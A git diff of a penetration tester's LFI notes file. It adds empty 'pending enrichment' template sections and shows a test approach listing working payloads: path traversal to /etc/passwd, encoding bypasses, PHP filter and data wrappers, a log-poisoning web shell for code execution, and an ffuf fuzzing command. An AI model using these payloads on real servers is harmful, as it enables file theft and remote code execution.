@@ -1,5 +1,63 @@
 # LFI Techniques
 
+> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.
+
+_Last updated: — · Items: 0_
+
+---
+
+## What
+
+_Define the class, prerequisites, and typical finding shape. Fill with real content._
+_pending enrichment — baseline opener below_
+
+See items under ## Items for per-finding details.
+
+---
+
+## CVEs
+
+_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._
+
+---
+
+## Probes
+
+_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
+_pending enrichment_
+
+---
+
+## PoCs
+
+_Public PoC links rolled up from items below._
+
+_No PoCs in items yet._
+
+---
+
+## Reproduction
+
+_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
+_pending enrichment_
+
+---
+
+## Defense
+
+_Patch guidance and detection rules. Populated from vendor advisories._
+_pending enrichment_
+
+---
+
+## References
+
+_Populated by daily refresh-latest pipeline._
+
+---
+
+## Items
+
 > Local File Inclusion — forcing a server to include or read arbitrary local files, leaking source code, credentials, or enabling code execution via log poisoning.
 
 ## Surface
@@ -14,34 +72,45 @@
 ## Test Approach
 
 1. **Basic traversal** — start with `../` sequences, count directory depth:
+
    ```
    ?page=../../../../etc/passwd
    ?file=....//....//....//etc/passwd
    ```
+
 2. **Null byte / encoding bypasses**:
+
    ```
    ?page=../../../etc/passwd%00
    ?page=..%252f..%252f..%252fetc/passwd   # double-encode
    ?page=....\/....\/etc/passwd            # mixed slashes
    ```
+
 3. **PHP wrappers** — test for PHP-specific extension tricks:
+
    ```
    ?page=php://filter/convert.base64-encode/resource=index.php
    ?page=php://input  (POST body as PHP code)
    ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
    ```
+
 4. **Log poisoning → RCE** — inject PHP into User-Agent, then include log:
+
    ```
    User-Agent: <?php system($_GET['cmd']); ?>
    GET /index.php?page=../../../../var/log/apache2/access.log&cmd=id
    ```
+
 5. **Blind file oracle** — probe for file existence via timing or error differences:
+
    ```
    ffuf -u "https://target.com/download?file=FUZZ" \
      -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
      -mr "root:" -t 30
    ```
+
 6. **Windows targets** — use backslash and drive letters:
+
    ```
    ?file=..\..\..\..\windows\win.ini
    ?file=C:\inetpub\wwwroot\web.config
